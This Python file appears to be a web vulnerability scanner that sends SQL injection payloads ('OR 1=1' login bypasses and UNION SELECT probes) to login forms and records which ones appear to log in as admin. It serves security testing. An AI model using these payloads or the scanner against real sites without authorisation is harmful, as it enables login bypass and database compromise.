import requests
import json


class SQLInjectionScanner:
    """Class to scan for SQL Injection vulnerabilities in web forms."""

    PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 'a'='a",
        "' UNION SELECT NULL, version() --",
        "' UNION SELECT NULL, user() --"
    ]

    SEVERITY = {
        "High": "SQL Injection is critical and can lead to complete database compromise.",
        "Medium": "Possible vulnerability but might be harder to exploit.",
        "Low": "Minor issue with SQL query, unlikely to be exploitable."
    }

    def __init__(self, mapped_data_file="mapped_data.json", results_file="security_scan_results.json"):
        self.mapped_data_file = mapped_data_file
        self.results_file = results_file
        self.scan_results = {}
        self.sql_injection_detected = False  # ✅ Added flag

    def load_mapped_data(self):
        """Load mapped website data from JSON file."""
        try:
            with open(self.mapped_data_file, "r") as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"⚠️ Error loading JSON file: {e}")
            return None

    def detect_sql_injection(self, target_url, form):
        """Test SQL Injection vulnerabilities for a given form."""
        print(f"\n🔍 Testing form at: {target_url}")

        post_data = {"username": "admin", "password": ""}

        for payload in self.PAYLOADS:
            post_data["password"] = payload
            print(f"🛠️  Testing payload: {payload}")

            try:
                response = requests.post(target_url, data=post_data, timeout=5)

                if response.status_code == 200 and ("Welcome" in response.text or "Dashboard" in response.text):
                    print(f"  ⚠️ Possible SQL Injection Detected at {target_url}!")
                    print(f"  🔹 Vulnerable payload: {payload}")

                    if target_url not in self.scan_results:
                        self.scan_results[target_url] = []

                    severity = "High"

                    self.scan_results[target_url].append({
                        "payload": payload,
                        "vulnerable": True,
                        "severity": severity,
                        "severity_description": self.SEVERITY[severity]
                    })

                    self.sql_injection_detected = True  # ✅ Set flag to True if SQLi is detected
                    return  # Stop testing once a vulnerability is found

            except requests.RequestException as e:
                print(f"  ❌ Error: {e}")

    def save_scan_results(self):
        """Save scan results to a JSON file without overwriting previous results."""
        try:
            with open(self.results_file, "r") as f:
                previous_results = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            previous_results = {}

        if "scans" not in previous_results:
            previous_results["scans"] = {}

        previous_results["scans"][self.__class__.__name__] = self.scan_results

        with open(self.results_file, "w") as f:
            json.dump(previous_results, f, indent=4)

        print("\n✅ SQL Injection scan complete! Results saved in security_scan_results.json")

    def run(self):
        """Run the SQL Injection scanner."""
        print("\n🚀 Scanning for SQL Injection vulnerabilities...\n")

        mapped_data = self.load_mapped_data()
        if not mapped_data:
            print("❌ No mapped data found. Exiting SQL injection scan.")
            return False  # ✅ Return False if no scan is possible

        for page in mapped_data.get("pages", []):
            for form in page.get("forms", []):
                if form["method"] == "POST" and "username" in form["inputs"] and "password" in form["inputs"]:
                    self.detect_sql_injection(form["action"], form)

        self.save_scan_results()
        return self.sql_injection_detected  # ✅ Return True if SQLi was found, else False

if __name__ == "__main__":
    scanner = SQLInjectionScanner()
    scanner.run()
